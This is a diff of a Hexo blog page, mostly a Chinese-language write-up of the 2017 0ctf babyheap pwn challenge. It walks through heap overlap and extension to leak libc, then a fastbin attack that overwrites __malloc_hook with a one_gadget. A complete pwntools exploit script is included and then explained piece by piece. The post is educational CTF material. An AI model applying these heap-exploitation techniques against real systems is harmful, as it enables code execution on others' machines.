@@ -6,15 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="之前学习了一下lager bins的构建，今天来学习一下堆重叠和堆扩展先找漏洞点这里没有对大小进行检查，可以输入任意字节，存在字节溢出此题的难点在于如何泄露libc，由于add使用calloc的原因，当堆块从bins中拿出来时，会清空堆块很明显我们要申请大的堆块进入unsorted bins来使main_aren+88写在堆块上，我们可以使上一个堆块扩展到这个堆块上来进行泄露先贴上exp">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/page/2/index.html">
+<meta property="og:url" content="http://example.com/2021/08/09/2017%200ctf%20babyheap/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="之前学习了一下lager bins的构建，今天来学习一下堆重叠和堆扩展先找漏洞点这里没有对大小进行检查，可以输入任意字节，存在字节溢出此题的难点在于如何泄露libc，由于add使用calloc的原因，当堆块从bins中拿出来时，会清空堆块很明显我们要申请大的堆块进入unsorted bins来使main_aren+88写在堆块上，我们可以使上一个堆块扩展到这个堆块上来进行泄露先贴上exp">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/59da792fd1a64590b04589fe0feea865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-08-09T07:42:45.883Z">
+<meta property="article:modified_time" content="2021-08-09T07:42:45.950Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/59da792fd1a64590b04589fe0feea865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,235 +160,164 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-2017 0ctf babyheap" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>之前学习了一下lager bins的构建，今天来学习一下堆重叠和堆扩展<br>先找漏洞点<br><img src="https://img-blog.csdnimg.cn/59da792fd1a64590b04589fe0feea865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里没有对大小进行检查，可以输入任意字节，存在字节溢出<br>此题的难点在于如何泄露libc，由于add使用calloc的原因，当堆块从bins中拿出来时，会清空堆块<br>很明显我们要申请大的堆块进入unsorted bins来使main_aren+88写在堆块上，我们可以使上一个堆块扩展到这个堆块上来进行泄露<br>先贴上exp</p>
+<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(b))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;Content: &#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">a</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">a</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x40</span> + <span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;libc_base =&quot;</span> +<span class="built_in">hex</span>(libc_base) )</span><br><span class="line">libc.address=libc_base-<span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] </span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;malloc = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">27</span>+<span class="number">8</span>-<span class="number">0x10</span>)+ p64(libc.address + <span class="number">0x4527a</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>我们申请四个堆块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+<p>第一个用来对第二个堆块溢出，第三个是用来进行unsorted bins的，第四个堆块来防止上个堆块与top chunk合并<br>当我们要泄漏libc时，很明显要扩展到unsorted bins的fd位，为了泄露libc，我们要让第二个堆扩展0x20，来和unsorted bins的fd进行重叠</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+<p>首先我们要把size扩大，但free时存在检查，我们要把下一个堆块的pre_size位和size位改正</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x40</span> + <span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+<p>释放堆块，在申请回来，这样原本0x40大小的堆块变成了0x60大小，但因为calloc的影响，我们要在对下一个堆块的head进行修改，申请一个堆块来防止合并</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;libc_base =&quot;</span> +<span class="built_in">hex</span>(libc_base) )</span><br><span class="line">libc.address=libc_base-<span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure>
+<p>释放unsorted bins，unsorted bins的位置和大小都没变，但是吧0x60的一部分释放掉了，所以当我们show0x60时，会把libc一起释放出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] </span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;malloc = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+<p>接下来就是常规的劫持流，fastbins要检查size位的，如果我们之间申请malloc hook的话会出错，所以我们要在malloc上面找一个和0x70有关的数<br>经过调试我们发现在malloc-35的位置值是0x7f，由于in_use位的关系低位和大小无关，所以这个size当做0x70大小，正好符合我们的要求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">27</span>+<span class="number">8</span>-<span class="number">0x10</span>)+ p64(libc.address + <span class="number">0x4527a</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>修改fd位，申请到malloc hook上面的堆块，进行填充到malloc_hook，填入one_gadget，我们申请堆块的时候就会触发</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/05/%5BZJCTF%202019%5DLogin%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-03-05T15:18:05.039Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-05</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/08/09/2017%200ctf%20babyheap/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/05/babyfengshui_33c3_2016%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-03-05T11:49:27.477Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-05</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/24/%5BBJDCTF%202nd%5Dydsneedgirlfriend2%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-24T11:40:43.651Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-24</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2021/08/09/2021-06-05/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/17/(Jarvis%20Oj)level5%E7%9A%84wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/22/%5BBJDCTF%202nd%5Dr2t4%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-22T08:51:39.692Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-22</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/22/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN%E4%B9%8B%E6%A0%88%E8%BF%81%E7%A7%BB/" class="archive-article-date">
-  	<time datetime="2021-02-22T08:10:56.478Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-22</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:07:38.398Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ez_pz_hackover_2016%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:06:51.785Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ciscn_2019_es_2%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:05:02.459Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/13/babyheap_0ctf_2017%20%E2%80%94%E2%80%94%E5%A0%86%E5%85%A5%E9%97%A8/" class="archive-article-date">
-  	<time datetime="2021-02-13T12:10:01.651Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/09/%5BBUUCTF%5DPWN%E2%80%94%E2%80%94ciscn_2019_ne_5/" class="archive-article-date">
-  	<time datetime="2021-02-09T09:22:44.059Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-09</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/">&amp;laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/3/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -406,8 +341,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
